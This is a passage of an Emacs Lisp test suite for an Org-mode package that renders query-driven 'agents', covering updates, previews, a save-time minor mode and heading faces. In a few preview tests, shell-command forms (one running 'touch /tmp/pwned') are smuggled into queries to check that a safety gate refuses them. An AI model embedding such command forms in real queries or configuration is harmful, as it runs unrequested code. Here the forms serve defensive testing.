      (should (string-match-p "unreadable :AGENT_QUERY:" report))
      (with-current-buffer (find-file-noselect agent-file)
        (should (string-match-p ":AGENT_MATCHED: 1" (buffer-string)))
        ;; Nothing was recorded for the agent that failed.
        (goto-char (point-min))
        (should (equal "Broken agent" (org-get-heading t t t t)))
        (should-not (org-entry-get nil "AGENT_MATCHED"))
        (should (= 1 (cl-count-if
                      (lambda (l) (string-match-p ":AGENT_MATCHED:" l))
                      (split-string (buffer-string) "\n"))))))))

(ert-deftest org-agents-test-update-all-reads-files-and-directories ()
  "`org-agents-files' names files, directories, or the agenda."
  (org-agents-test--with-corpus
    (let ((org-agents-files (list dir)))
      ;; The corpus files hold no agents, so the whole directory yields
      ;; only the one in agents.org.
      (should (string-match-p "updated 1 agent\\'" (org-agents-update-all))))
    ;; A file named twice over -- here by a directory and by itself -- is
    ;; updated once, rather than reported as two agents where one is.
    (let ((org-agents-files (list dir agent-file)))
      (should (string-match-p "updated 1 agent\\'" (org-agents-update-all))))
    (let ((org-agents-files (list (expand-file-name "nowhere.org" dir))))
      (should (string-match-p "updated 0 agents" (org-agents-update-all))))
    (cl-letf (((symbol-function 'org-agenda-files)
               (lambda (&rest _) (list agent-file))))
      (let ((org-agents-files 'agenda))
        (should (string-match-p "updated 1 agent\\'"
                                (org-agents-update-all)))))))

(ert-deftest org-agents-test-update-all-continues-past-an-unreadable-file ()
  "A file that cannot be visited costs that file, not the whole run.
`find-file-noselect' can fail or ask a question of its own -- a file grown
past `large-file-warning-threshold', one changed on disk since it was last
visited, a coding system that cannot decode it.  Unguarded, that took with
it every count already accumulated and `org-agents--report' never ran at
all, so an update over a file set stopped silently partway through."
  (org-agents-test--with-corpus
    (let* ((bad (expand-file-name "unreadable.org" dir))
           (org-agents-files (list agent-file bad))
           (real (symbol-function 'find-file-noselect)))
      (with-temp-file bad
        (insert "* Agent in a file that will not open\n:PROPERTIES:\n"
                ":AGENT_QUERY: (todo)\n:END:\n"))
      (cl-letf (((symbol-function 'find-file-noselect)
                 (lambda (file &rest args)
                   (if (equal (file-truename file) (file-truename bad))
                       (error "Opening `%s': bad coding system" file)
                     (apply real file args)))))
        (let ((report (org-agents-update-all)))
          ;; The good file was still updated, and the summary still printed.
          (should (string-match-p "updated 1 agent" report))
          (should (string-match-p "1 failed" report))
          ;; The failure names the FILE, since no agent in it was reached.
          (should (string-match-p "unreadable\\.org" report))
          (should (string-match-p "bad coding system" report))))
      ;; And the agent that could be reached really was written.
      (with-current-buffer (find-file-noselect agent-file)
        (should (string-match-p ":AGENT_MATCHED: 1" (buffer-string)))))))

(ert-deftest org-agents-test-preview-applies-exclusion ()
  "What a preview lists is what an agent would render, aliases excluded."
  (let (received files)
    ;; A preview searches the agenda, so the fixture has to supply one:
    ;; batch implies `-q', which leaves `org-agenda-files' empty, and a
    ;; preview refuses that rather than searching the current buffer.
    ;;
    ;; The file is a REAL one, and it has to be.  The fixture named
    ;; \"a.org\" for as long as `org-ql-search' was stubbed and nothing ever
    ;; tried to open it -- but a preview now checks its file list for
    ;; readability before org-ql sees it, exactly as an agent's scope is
    ;; checked, so a name that is not there is skipped and named and the
    ;; list arrives empty.  See `org-agents--readable-files'.
    (let ((real (make-temp-file "org-agents-preview" nil ".org"
                                "* TODO Something\n")))
      (unwind-protect
          (cl-letf (((symbol-function 'org-agenda-files) (lambda (&rest _) (list real)))
                    ((symbol-function 'org-ql-search)
                     (lambda (fs query &rest _) (setq files fs received query))))
            (org-agents-preview "(todo)")
            (should (equal received `(and (todo) ,org-agents-exclude)))
            (should (equal files (list real)))
            ;; The `$PROP' layer is expanded exactly as an agent's query is.
            (org-agents-preview "(and (todo) $URL)")
            (should (equal received
                           `(and (and (todo) (property "URL")) ,org-agents-exclude)))
            ;; And with the exclusion off, the query alone: nil conjoined here
            ;; would be a clause that never matches.
            (let ((org-agents-exclude nil))
              (org-agents-preview "(todo)")
              (should (equal received '(todo)))))
        (delete-file real)))))

(ert-deftest org-agents-test-preview-refuses-an-empty-agenda ()
  "A preview with no agenda files must not fall back to the current buffer.
Handed no files, `org-ql-search' searches the buffer point is in, so a
preview would list matches from wherever the user was standing under a
heading that says it searched the agenda.  `org-agents--collect' guards
the same case for the same reason."
  (cl-letf (((symbol-function 'org-agenda-files) #'ignore)
            ((symbol-function 'org-ql-search)
             (lambda (&rest _) (error "must not search the current buffer"))))
    (let ((err (should-error (org-agents-preview "(todo)") :type 'user-error)))
      (should (string-match-p "org-agenda-files" (error-message-string err))))))

(ert-deftest org-agents-test-preview-gates-and-reads-its-query ()
  "A preview is gated like an agent, and evaluates nothing it refuses.
`org-agenda-files' is stubbed, and each error is matched by TEXT.  Left
unstubbed, batch leaves the agenda empty and the preview's own \"nothing
to preview\" `user-error' satisfied every `should-error' here: deleting
the gate call from `org-agents-preview' outright left this test green."
  (cl-letf (((symbol-function 'org-agenda-files) (lambda (&rest _) '("a.org")))
            ((symbol-function 'org-ql-search)
             (lambda (&rest _) (error "must not be reached"))))
    (let ((err (should-error (org-agents-preview "(and (todo")
                             :type 'user-error)))
      (should (string-match-p "the query" (error-message-string err))))
    (let ((err (should-error (org-agents-preview "(headline \"x\")")
                             :type 'user-error)))
      (should (string-match-p "not an org-ql predicate"
                              (error-message-string err))))
    (let ((org-agents--session-approved (make-hash-table :test 'equal))
          (org-agents-safe-queries nil)
          (noninteractive t))
      (let ((err (should-error
                  (org-agents-preview "(and (todo) (shell-command \"x\"))")
                  :type 'user-error)))
        (should (string-match-p "not approved" (error-message-string err))))
      ;; "evaluates nothing it refuses" is a claim about EVALUATION, and a
      ;; `should-error' makes only the claim that it refused.  The tripwire
      ;; counter makes the other half, exactly as
      ;; `org-agents-test-gate-refuses-bare-call' does for the gate itself.
      (let ((org-agents-test--tripwire-count 0))
        (should-error (org-agents-preview "(and (todo) (org-agents-test--tripwire))")
                      :type 'user-error)
        (should (= 0 org-agents-test--tripwire-count))))))

(ert-deftest org-agents-test-preview-gates-the-form-it-runs ()
  "A preview refuses a form its exclusion made unsafe.
The query is structurally safe, so only the exclusion can stop it -- and
if the gate is handed the query rather than the appended form, nothing
does and `org-ql-search' is reached."
  (cl-letf (((symbol-function 'org-agenda-files) (lambda (&rest _) '("a.org")))
            ((symbol-function 'org-ql-search)
             (lambda (&rest _) (error "must not be reached"))))
    (let ((org-agents--session-approved (make-hash-table :test 'equal))
          (org-agents-safe-queries nil)
          (noninteractive t)
          (org-agents-exclude '(shell-command "touch /tmp/pwned")))
      (let ((err (should-error (org-agents-preview "(todo)") :type 'user-error)))
        (should (string-match-p "not approved" (error-message-string err)))))))

(ert-deftest org-agents-test-preview-names-an-unreadable-agenda-file ()
  "A preview reaches org-ql with a file list too, and met the same type error.
REPRODUCED: `org-agents-preview' over an `org-agenda-files' holding one
path that is not there signalled `wrong-type-argument bufferp \"Error
\(org-ql-select): Can\\='t open file: ...\"' -- the same defect
`org-agents-test-scope-names-an-unreadable-file' pins for an agent, one
entry point away.  A preview's scope is `agenda' by construction, so the
answer is the `agenda' answer: skipped, named once, and the readable file
still searched."
  (let ((real (make-temp-file "org-agents-preview" nil ".org" "* TODO Something\n"))
        (missing (expand-file-name "nope.org" (make-temp-file "org-agents-gone" t)))
        files)
    (unwind-protect
        (cl-letf (((symbol-function 'org-agenda-files)
                   (lambda (&rest _) (list real missing)))
                  ((symbol-function 'org-ql-search)
                   (lambda (fs &rest _) (setq files fs))))
          (let ((msgs (org-agents-test--messages (org-agents-preview "(todo)"))))
            (should (equal files (list real)))
            (should (cl-find-if (lambda (m)
                                  (and (string-match-p (regexp-quote missing) m)
                                       (string-match-p "cannot be read" m)))
                                msgs))))
      (delete-file real))))

(ert-deftest org-agents-test-preview-requires-org-ql-search-lazily ()
  "`org-ql-search' is this file's dependency for ONE command, so one command
requires it.  Derived from the SOURCE TEXT, and it has to be: the
property is about load order, and by the time this suite runs
`org-ql-search' is loaded, `fboundp' and stubbed by the preview tests
around it -- an ERT assertion against the runtime would pass whatever the
file says.  The same \"derive from the source\" discipline as
`org-agents-test-action-entry-point-list-is-complete'.

Three claims, and the third is the one that keeps the gate honest:

  - no top-level `(require \\='org-ql-search)';
  - one inside `org-agents-preview', so the command states its own
    dependency where it is used rather than leaving it inferred;
  - a `declare-function' for it, which is what silences the byte
    compiler UNCONDITIONALLY.  org-ql's own autoloads happen to carry
    `(autoload \\='org-ql-search \"org-ql-search\")', so the gate would
    pass on this machine with no declaration at all -- but that is a fact
    about an installed autoload file, not about this source.

What this does NOT claim, because it is measured false: that loading
org-agents no longer loads org-ql-search.  The chain is org-agents ->
`org-ql-ext' -> `org-ql-find' -> `org-ql-search', and `org-ql-ext' is the
author's live configuration, outside this repository.  MEASURED:
`(require \\='org-ql-ext)' alone takes `(featurep \\='org-ql-search)' from
nil to t.  So the load-time cost is not removed; what is removed is this
file claiming a dependency it does not have."
  (let* ((library (locate-library "org-agents"))
         (source (concat (file-name-sans-extension library) ".el")))
    (should (file-readable-p source))
    (with-temp-buffer
      (insert-file-contents source)
      ;; A top-level require begins at column zero.  The one inside the
      ;; command is indented, so the anchor tells them apart.
      (goto-char (point-min))
      (should-not (re-search-forward "^(require 'org-ql-search)" nil t))
      (goto-char (point-min))
      (should (re-search-forward
               "^(declare-function org-ql-search \"org-ql-search\")" nil t))
      ;; The require lives inside the command's own body: search from the
      ;; `defun' to the next top-level form.
      (goto-char (point-min))
      (should (re-search-forward "^(defun org-agents-preview " nil t))
      (let ((start (point))
            (end (or (and (re-search-forward "^(\\|^;;;###autoload" nil t)
                          (match-beginning 0))
                     (point-max))))
        (goto-char start)
        (should (re-search-forward "(require 'org-ql-search)" end t))))))

(ert-deftest org-agents-test-dblock-type-is-registered ()
  "`C-c C-x x' offers the block, and what it offers INSERTS one.
`columnview' and `clocktable' register inserters there, and this must
too: registering `org-agents-update' instead would error on a plain
heading, which has no agent to update, and on a `children' agent would
rewrite its aliases rather than insert anything."
  (should (member "org-agents" (org-dynamic-block-types)))
  (should (eq #'org-agents-insert-dblock
              (org-dynamic-block-function "org-agents")))
  ;; On a plain heading -- no agent anywhere -- it inserts a block.
  (with-temp-buffer
    (org-mode)
    (insert "* Just a heading\n")
    (funcall (org-dynamic-block-function "org-agents"))
    (should (string-match-p "^#\\+BEGIN: org-agents\n#\\+END:$" (buffer-string)))
    ;; And Org reads back what it wrote as a block of this type.
    (goto-char (point-min))
    (should (re-search-forward org-dblock-start-re nil t))
    (should (equal "org-agents" (match-string 1))))
  ;; Point mid-line does not get the block written onto the end of it.
  (with-temp-buffer
    (org-mode)
    (insert "* Heading with no final newline")
    (org-agents-insert-dblock)
    (should (string-match-p "no final newline\n#\\+BEGIN: org-agents"
                            (buffer-string)))))

;;;; Minor mode

;; Every test here saves a real file, through `save-buffer', and reads the
;; result back off disk rather than out of the buffer that wrote it: what
;; the mode promises is about the bytes that reach the file.

(defun org-agents-test--file-text (file)
  "The bytes of FILE, read off disk rather than out of a buffer.
Read literally, because the comparison these tests make is a byte
comparison: a decoded string would hide a difference in the bytes, and a
buffer visiting the file would hide whether the save wrote anything at
all."
  (with-temp-buffer
    (set-buffer-multibyte nil)
    (insert-file-contents-literally file)
    (buffer-string)))

(ert-deftest org-agents-test-mode-hooks-the-buffer-it-was-enabled-in ()
  "Enabling arms this buffer's save; disabling disarms it again.
Buffer-locally, and nowhere else: added to the global value, the hook
would scan every save in the session -- Org buffer or not -- for agents."
  (let ((global (default-value 'before-save-hook)))
    (with-temp-buffer
      (org-mode)
      (org-agents-mode 1)
      (should org-agents-mode)
      (should (local-variable-p 'before-save-hook))
      (should (memq #'org-agents--update-on-save before-save-hook))
      (should (equal global (default-value 'before-save-hook)))
      (org-agents-mode -1)
      (should-not org-agents-mode)
      (should-not (memq #'org-agents--update-on-save before-save-hook))
      (should (equal global (default-value 'before-save-hook))))))

(ert-deftest org-agents-test-mode-refuses-a-non-org-buffer ()
  "There are no agents outside Org, and the mode says so rather than arm.
It must be OFF afterwards as well: `define-minor-mode' sets the variable
before the body runs, so a refusal that only signaled would leave a mode
reporting itself enabled with no hook behind it."
  (with-temp-buffer
    (fundamental-mode)
    (should-error (org-agents-mode 1) :type 'user-error)
    (should-not org-agents-mode)
    (should-not (memq #'org-agents--update-on-save before-save-hook))))

(ert-deftest org-agents-test-mode-renders-on-save ()
  "A save with the mode on renders the buffer's agents before writing.
`set-buffer-modified-p' rather than an edit: `save-buffer' does nothing at
all to an unmodified buffer, so a test that only visited the file would
assert nothing."
  (org-agents-test--with-corpus
    (with-current-buffer (find-file-noselect agent-file)
      (org-agents-mode 1)
      (set-buffer-modified-p t)
      (save-buffer)
      (should-not (buffer-modified-p))
      (should (string-match-p "Fix widget" (buffer-string)))
      ;; And in the file, not merely in the buffer that saved it.
      (let ((text (org-agents-test--file-text agent-file)))
        (should (string-match-p "Fix widget" text))
        (should (string-match-p ":AGENT_MATCHED: 1 \\[" text))))))

(ert-deftest org-agents-test-mode-save-that-renders-the-same-writes-no-bytes ()
  "A save whose render is the render already there leaves the file alone.
This is the test that fails if `:AGENT_MATCHED:' is stamped on every save
regardless: a stamp records when an update found what it found, so
restamping it rewrites the file -- and the timestamp a reader trusts --
every time the buffer is saved for any reason at all.

The old stamp is written BY HAND rather than left over from the first
save, and that is what makes the test discriminate: the stamp has minute
resolution, so two saves in the same minute produce the same text and an
unconditional stamp would go unnoticed.  A stamp naming 2020 cannot."
  (org-agents-test--with-corpus
    (with-current-buffer (find-file-noselect agent-file)
      (org-agents-mode 1)
      (set-buffer-modified-p t)
      (save-buffer)
      (goto-char (point-min))
      (org-entry-put nil "AGENT_MATCHED" "1 [2020-01-01 Wed 09:00]")
      (save-buffer)
      (let ((first (org-agents-test--file-text agent-file)))
        ;; The render found what it had found before, so the stamp was left
        ;; as it was and still names the day it was written for.
        (should (string-match-p ":AGENT_MATCHED: 1 \\[2020-01-01 Wed 09:00\\]"
                                first))
        ;; And a further save changes not one byte of it.
        (set-buffer-modified-p t)
        (save-buffer)
        (should (equal first (org-agents-test--file-text agent-file)))))))

(ert-deftest org-agents-test-mode-save-restamps-when-the-render-changes ()
  "A new match is rendered on save, and the stamp is written afresh.
The other half of the contract: the buffer goes back as it was only when
the render wrote what was already there."
  (org-agents-test--with-corpus
    (with-current-buffer (find-file-noselect agent-file)
      (org-agents-mode 1)
      (set-buffer-modified-p t)
      (save-buffer)
      (goto-char (point-min))
      (org-entry-put nil "AGENT_MATCHED" "1 [2020-01-01 Wed 09:00]")
      (save-buffer)
      ;; A second entry in the corpus now matches.  Written through the
      ;; buffer visiting the file, because org-ql evaluates against the
      ;; live buffer and would not see a change made behind it.
      (with-current-buffer (find-file-noselect b)
        (goto-char (point-max))
        (insert "* TODO Second review\n:PROPERTIES:\n"
                ":NEXT_REVIEW: [2021-01-01 Fri]\n:END:\n")
        (save-buffer))
      (set-buffer-modified-p t)
      (save-buffer)
      (let ((text (org-agents-test--file-text agent-file)))
        (should (string-match-p "Second review" text))
        (should (string-match-p ":AGENT_MATCHED: 2 \\[" text))
        (should-not (string-match-p "2020-01-01" text))))))

(ert-deftest org-agents-test-mode-save-skips-an-agent-needing-a-prefilter ()
  "A scope that needs a prefilter is named and left alone, not run.
An update of such a scope has no bound on what it would open, and a save
is a keystroke.  The agent is skipped rather than reported as an error,
and the file is written all the same."
  (org-agents-test--with-corpus
    (with-current-buffer (find-file-noselect agent-file)
      (org-agents-mode 1)
      (goto-char (point-min))
      (org-entry-put nil "AGENT_SCOPE" "active")
      (let ((msgs (org-agents-test--messages (save-buffer))))
        ;; One message, naming the agent that was skipped and why.
        (should (cl-find-if
                 (lambda (m)
                   (and (string-prefix-p "org-agents: " m)
                        (string-match-p "needs a prefilter" m)
                        (string-match-p "Review agent" m)))
                 msgs))
        ;; Skipped, not failed: no summary reporting a failure.
        (should-not (cl-find-if (lambda (m) (string-match-p "failed" m)) msgs)))
      (should-not (buffer-modified-p))
      (should-not (string-match-p ":AGENT_MATCHED:" (buffer-string)))
      (should-not (string-match-p "Fix widget" (buffer-string)))
      ;; The save itself went through, edit and all.
      (should (string-match-p ":AGENT_SCOPE: active"
                              (org-agents-test--file-text agent-file))))))

(ert-deftest org-agents-test-mode-save-writes-the-file-past-a-bad-agent ()
  "An agent this package cannot read must not make the file unsavable.
The failure is reported, the agents around it are rendered, and the save
goes through: a query with a typo in it is exactly the state a file is in
while the typo is being fixed."
  (org-agents-test--with-corpus
    (with-current-buffer (find-file-noselect agent-file)
      (goto-char (point-max))
      (insert "* Bad agent\n:PROPERTIES:\n:AGENT_QUERY: (and (todo\n:END:\n")
      (org-agents-mode 1)
      (let ((msgs (org-agents-test--messages (save-buffer))))
        (should (cl-find-if (lambda (m)
                              (and (string-match-p "Bad agent" m)
                                   (string-match-p "unreadable" m)))
                            msgs)))
      (should-not (buffer-modified-p))
      (let ((text (org-agents-test--file-text agent-file)))
        ;; The good agent rendered, and the bad one is still there to fix.
        (should (string-match-p "Fix widget" text))
        (should (string-match-p "Bad agent" text))))))

(ert-deftest org-agents-test-mode-save-survives-a-bug-in-the-update ()
  "A failure anywhere in the update is reported and the save goes on.
`org-agents--update-markers' answers for a bad query already, so what is
covered here is everything around it: no bug in this package may make a
file unsavable.  The failure is injected rather than provoked, because a
bug that could be provoked would be one to fix instead."
  (org-agents-test--with-corpus
    (with-current-buffer (find-file-noselect agent-file)
      (org-agents-mode 1)
      (set-buffer-modified-p t)
      (let ((msgs (cl-letf (((symbol-function 'org-agents--savable-markers)
                             (lambda (&rest _) (error "injected"))))
                    (org-agents-test--messages (save-buffer)))))
        (should (cl-find-if (lambda (m)
                              (and (string-prefix-p "org-agents: " m)
                                   (string-match-p "injected" m)))
                            msgs)))
      ;; Written all the same.
      (should-not (buffer-modified-p))
      (should (string-match-p "Review agent"
                              (org-agents-test--file-text agent-file))))))

(ert-deftest org-agents-test-mode-save-lets-a-quit-abort-the-save ()
  "C-g during an update on save aborts the save along with the update.
`quit' is no subtype of `error', so the handler that keeps a bad query from
making a file unsavable does not catch it -- and that is deliberate: a
render interrupted half way through is not what the user asked to keep, so
the file is left exactly as it was."
  (org-agents-test--with-corpus
    (with-current-buffer (find-file-noselect agent-file)
      (org-agents-mode 1)
      (let ((before (org-agents-test--file-text agent-file)))
        (set-buffer-modified-p t)
        (cl-letf (((symbol-function 'org-agents--update-markers)
                   (lambda (&rest _) (signal 'quit nil))))
          (should (eq 'quit (condition-case nil (save-buffer) (quit 'quit)))))
        ;; The save stopped where the quit did.
        (should (equal before (org-agents-test--file-text agent-file)))
        (should (buffer-modified-p))))))

(ert-deftest org-agents-test-mode-save-is-silent-with-no-agents ()
  "A buffer holding no agent is saved without a word said about agents.
`global-org-agents-mode' arms a buffer whose text merely mentions the
property, so the hook runs over buffers with nothing in them for it to do
-- and a mode that announced itself on every such save would be worse than
no mode at all."
  (org-agents-test--with-corpus
    (with-current-buffer (find-file-noselect b)
      (org-agents-mode 1)
      (set-buffer-modified-p t)
      (let ((msgs (org-agents-test--messages (save-buffer))))
        (should-not (cl-find-if (lambda (m) (string-prefix-p "org-agents: " m))
                                msgs))))))

(ert-deftest org-agents-test-global-mode-arms-the-buffers-that-mention-a-query ()
  "The global mode arms an Org buffer whose text holds the property.
The detector is a text scan and not `org-agents--buffer-agents': a buffer
that only QUOTES the property line, in a body rather than in a drawer, is
armed too -- deliberately, because that costs one regexp search per save
while the authoritative scan, which asks each heading's own drawer, runs
at save time anyway."
  (org-agents-test--with-corpus
    (let ((prose (expand-file-name "prose.org" dir)))
      (with-temp-file prose
        (insert "* A note about agents\n"
                "An agent's own drawer holds a line reading\n"
                ":AGENT_QUERY: (and (todo) (property \"NEXT_REVIEW\"))\n"
                "and that property is what makes it an agent.\n"))
      (global-org-agents-mode 1)
      (unwind-protect
          (progn
            (with-current-buffer (find-file-noselect agent-file)
              (should org-agents-mode))
            (with-current-buffer (find-file-noselect b)
              (should-not org-agents-mode))
            (with-current-buffer (find-file-noselect prose)
              (should org-agents-mode)
              ;; And a save there finds no agent and says nothing.
              (set-buffer-modified-p t)
              (let ((msgs (org-agents-test--messages (save-buffer))))
                (should-not (cl-find-if
                             (lambda (m) (string-prefix-p "org-agents: " m))
                             msgs)))))
        (global-org-agents-mode -1))
      ;; Turning it off disarms what it armed.
      (with-current-buffer (find-file-noselect agent-file)
        (should-not org-agents-mode)))))

;;;; Appearance

;; `org-agents-faces-mode' changes no bytes, so every test here asserts on
;; a text property and nothing else -- and the one that asserts loudest is
;; `org-agents-test-faces-change-no-bytes', which watches the writers.
;;
;; HOW THESE TESTS SEE A FACE AT ALL, since `-batch' makes it look
;; impossible.  `font-lock-mode' refuses to enable when `noninteractive' is
;; non-nil or the buffer's name begins with a space, so it is nil
;; throughout, and this does not matter: `font-lock-ensure' does not go
;; through the mode.  It runs when `font-lock-specified-p' is non-nil,
;; which an Org buffer makes true by setting `font-lock-defaults', and it
;; calls `font-lock-ensure-function', whose default value fontifies unless
;; `font-lock-fontified' is set.  Nothing sets that outside
;; `font-lock-default-fontify-buffer' and `font-lock-turn-on-thing-lock',
;; neither of which runs here -- so every `font-lock-ensure' call really
;; re-fontifies, and `font-lock-default-fontify-region' unfontifies before
;; it fontifies, so a second call after a keyword change is a clean rebuild
;; and not a smear.  MEASURED, all of it.
;;
;; Two consequences for a reader adding a test here.  A test that enabled
;; `font-lock-mode' and asserted on a face would assert nothing, because
;; the mode turns itself straight back off.  And `with-temp-buffer' is
;; usable for a face -- the recipe above needs no `font-lock-mode' -- but
;; cannot reach the REAL jit-lock path, because its buffer is named
;; " *temp*" and the leading space is a second refusal.  Exactly one test
;; reaches that path, `org-agents-test-faces-flush-reaches-jit-lock', and
;; it says there how.

(defconst org-agents-test--faces-registry "\
* STATUS
:PROPERTIES:
:ATTR_TYPE:    string
:ATTR_VALUES:  active stalled done :ETC
:ATTR_DEFAULT: active
:ATTR_FACES:   active org-todo | stalled org-warning \
| done org-agents-test--nonesuch-face
:END:
Where the entry stands.

* OWNER
:PROPERTIES:
:ATTR_TYPE:  string
:ATTR_FACES: ada bold
:END:
Who has it.

* Prototypes
** Task
:PROPERTIES:
:STATUS: stalled
:END:
"
  "Two face-declaring attributes and one prototype, in a deliberate ORDER.
`STATUS' is declared FIRST, which is what
`org-agents-test-faces-first-declaration-wins' asserts on: the precedence
rule is the registry's own file order, and a test that did not depend on
the order would not notice a reader that sorted.

`done' is mapped to a face that does not exist, on purpose.  A typo in a
registry is a diagnostic and not an error, and the two tests that say so
need a name Emacs will never define.

`:ATTR_DEFAULT: active' is what makes an entry spelling NOTHING AT ALL
faced, which is the case a text scan cannot find and the whole reason
`org-agents--faces-turn-on' does not do one.")

(defconst org-agents-test--faces-corpus
  '(("a.org" . "\
* Local
:PROPERTIES:
:STATUS: stalled
:END:
* Follower
:PROPERTIES:
:PROTOTYPE: Task
:END:
* Bare
* Unmapped
:PROPERTIES:
:STATUS: waiting
:END:
* Shouted
:PROPERTIES:
:STATUS: STALLED
:END:
* Both
:PROPERTIES:
:STATUS: stalled
:OWNER: ada
:END:
* Second
:PROPERTIES:
:STATUS: waiting
:OWNER: ada
:END:
* Typo
:PROPERTIES:
:STATUS: done
:END:
* Typo and owner
:PROPERTIES:
:STATUS: done
:OWNER: ada
:END:
"))
  "One entry per case the mode has to get right, named for its case.
`Local' spells the value; `Follower' spells only `:PROTOTYPE:'; `Bare'
spells nothing and takes `:ATTR_DEFAULT:' -- and all three must be faced
identically where they resolve identically, which is the point of the
mode.  `Unmapped' and `Shouted' resolve to values `:ATTR_FACES:' does not
name.  `Both' has a value under each attribute and must take the first
declaration's.  `Second' has an unmapped `STATUS' and a mapped `OWNER',
so it pins that a miss CONTINUES the walk.  `Typo' maps to a face that
does not exist, and `Typo and owner' pins that an unknown face does not
end the walk either.")

(defun org-agents-test--faces-many (n drawn)
  "A corpus of one file holding N entries, of which only DRAWN is faced.
Every other entry spells `:STATUS: waiting', which `:ATTR_FACES:' does
not name, so it resolves and is not drawn.

Mostly-undrawn is the shape that makes the cost test discriminate, and
finding that out cost a test that did not.  The matcher's LIMIT bounds
its INTERNAL loop -- the one that runs on past a headline it does not
face -- so a fixture in which every headline is faced stops that loop at
the first line either way, and a matcher searching with a nil LIMIT
scored the same as one honouring it.  With only one entry drawn, a
LIMIT-less search runs from the region to the end of the buffer looking
for a second, and the count says so."
  (list (cons "many.org"
              (mapconcat
               (lambda (i)
                 (format "* Entry %d\n:PROPERTIES:\n:STATUS: %s\n:END:\n"
                         i (if (= i drawn) "stalled" "waiting")))
               (number-sequence 1 n) ""))))

(defun org-agents-test--face-at (heading)
  "The `face' property on HEADING's title text and on its stars, as a plist.
Both halves, because the mode promises something about each: the title
carries our face ahead of Org's, and the stars carry Org's alone -- which
is what keeps `org-hide-leading-stars' working."
  (save-excursion
    (goto-char (point-min))
    (unless (re-search-forward
             (concat "^\\(\\*+\\) \\(" (regexp-quote heading) "\\)$") nil t)
      (error "org-agents-test: no heading `%s' in %s" heading (buffer-name)))
    (list :title (get-text-property (match-beginning 2) 'face)
          :stars (get-text-property (match-beginning 1) 'face))))

(defun org-agents-test--title-face (heading)
  "The `face' property on HEADING's title text."
  (plist-get (org-agents-test--face-at heading) :title))

(defmacro org-agents-test--with-faces-buffer (&rest body)
  "Run BODY in the corpus's first file, visited, faced and fontified.
`files' comes from `org-agents-test--with-attr-corpus', which is what
supplies the registry these faces are declared in."
  (declare (indent 0) (debug t))
  `(with-current-buffer (find-file-noselect (car files))
     (org-agents-faces-mode 1)
     (font-lock-ensure)
     ,@body))

(ert-deftest org-agents-test-faces-a-resolved-value-however-it-arrives ()
  "A local value, a prototype's value and a declared default face alike.
This is the whole of the epic in one assertion.  `Local' spells `stalled'
in its own drawer, `Follower' spells only `:PROTOTYPE: Task', and `Bare'
spells nothing whatever -- and the mode draws each of them from what it
RESOLVES, so the first two are `org-warning' and the third is the
default's `org-todo'.  Nothing in `Follower' or `Bare' says `stalled' or
`active', which is exactly why `org-entry-get' cannot be what answers
here.

Our face is PREPENDED onto Org's rather than replacing it, so
`org-level-1' survives underneath and everything the attribute does not
specify -- the height, the family -- still comes from Org.  MEASURED, the
four `OVERRIDE' values give `(org-warning org-level-1)' for `prepend',
`(org-level-1 org-warning)' for `append' (Org's colour wins and ours is
dead weight), `org-level-1' alone for `keep' (ours never applies) and
`org-warning' alone for t, which DESTROYS `org-level-N' outright.

And the stars keep `org-level-1' by itself: the keyword faces the heading
text and never the leading stars."
  (org-agents-test--with-attr-corpus org-agents-test--faces-registry
      org-agents-test--faces-corpus
    (org-agents-test--with-faces-buffer
      (should (equal '(:title (org-warning org-level-1) :stars org-level-1)
                     (org-agents-test--face-at "Local")))
      (should (equal '(:title (org-warning org-level-1) :stars org-level-1)
                     (org-agents-test--face-at "Follower")))
      (should (equal '(:title (org-todo org-level-1) :stars org-level-1)
                     (org-agents-test--face-at "Bare"))))))

(ert-deftest org-agents-test-faces-an-unnamed-value-is-not-faced ()
  "A resolved value `:ATTR_FACES:' does not name leaves the headline alone.
Whole and case-SENSITIVELY, and both halves are one decision with
`property-resolved''s own `string-equal' and with
`org-agents-attribute-valid-p''s \"compared case-SENSITIVELY, because a
declared vocabulary is one the user wrote down\".  The three must not
drift, so `Shouted' -- which spells `STALLED' -- is not faced either.

Silently.  A value outside the drawn set is the ordinary case, not a
fault: `org-agents-check-attributes' is what reports a value outside its
vocabulary, and a fontifier that messaged about one would say it on every
scroll."
  (org-agents-test--with-attr-corpus org-agents-test--faces-registry
      org-agents-test--faces-corpus
    (let (msgs)
      (setq msgs (org-agents-test--messages
                   (org-agents-test--with-faces-buffer
                     (should (eq 'org-level-1
                                 (org-agents-test--title-face "Unmapped")))
                     (should (eq 'org-level-1
                                 (org-agents-test--title-face "Shouted"))))))
      (should-not (cl-find-if (lambda (m) (string-match-p "waiting\\|STALLED" m))
                              msgs)))))

(ert-deftest org-agents-test-faces-first-declaration-wins ()
  "Two attributes name a face for one entry; the registry's order decides.
`org-agents-attributes' answers in FILE order -- \"the registry is a
document, and the order its author chose is information\" -- and the walk
stops at the first declaration that resolves to a named value.  So `Both'
takes `STATUS''s `org-warning' and not `OWNER''s `bold', and there is no
option to spell that differently: the ordering already has a spelling the
user controls, which is where the declarations sit in the file.

`Second' is the other half and is what makes this a test of the ORDER
rather than of the first element: its `STATUS' resolves to a value
`:ATTR_FACES:' does not name, and the walk must therefore CONTINUE and
find `OWNER''s."
  (org-agents-test--with-attr-corpus org-agents-test--faces-registry
      org-agents-test--faces-corpus
    (org-agents-test--with-faces-buffer
      (should (equal '(org-warning org-level-1)
                     (org-agents-test--title-face "Both")))
      (should (equal '(bold org-level-1)
                     (org-agents-test--title-face "Second"))))))

(ert-deftest org-agents-test-faces-an-undefined-face-is-a-diagnostic ()
  "A face the registry names and Emacs does not costs its mapping only.
Three things, and the second and third are what make it a diagnostic
rather than an error.  It is said ONCE, by attribute and face, however
many entries map to it -- keyed through the same
`org-agents--prototype-report' table the prototype diagnostics use, so a
scroll does not re-say it.  The rest of the buffer is faced normally,
which a `user-error' out of a matcher would have cost.  And the walk
CONTINUES past it, so `Typo and owner' still takes `OWNER''s `bold' --
the unknown face costs its own mapping and not the declarations after it.

`facep' is checked at USE and never at READ, and
`org-agents--attr-parse-faces' says why: a face this names may well be
defined by a theme loaded after the registry was first read, so a reader
that validated would reject it for good."
  (org-agents-test--with-attr-corpus org-agents-test--faces-registry
      org-agents-test--faces-corpus
    (let ((msgs (org-agents-test--messages
                  (org-agents-test--with-faces-buffer
                    (should (eq 'org-level-1
                                (org-agents-test--title-face "Typo")))
                    (should (equal '(bold org-level-1)
                                   (org-agents-test--title-face "Typo and owner")))
                    ;; Every other entry in the same buffer is faced.
                    (should (equal '(org-warning org-level-1)
